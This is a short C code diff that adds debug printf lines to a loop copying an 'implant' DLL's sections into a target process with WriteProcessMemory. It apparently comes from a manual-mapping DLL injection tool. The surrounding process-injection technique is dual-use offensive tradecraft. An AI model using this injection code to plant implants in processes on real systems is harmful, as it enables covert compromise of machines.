@@ -264,7 +264,9 @@ int main(int argc, char **argv) {
      * Copy in sections
      * *********************/
 
+    printf("Number of sections in implant DLL: %d\n", nt->FileHeader.NumberOfSections);
     for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+        printf("Copying section into process memory: %s, size: %d\n", section->Name, section->SizeOfRawData);
         WriteProcessMemory(target_process_handle, target_base_addr + section->VirtualAddress, local_dll_base + section->PointerToRawData, section->SizeOfRawData, NULL);
         section++;
     }
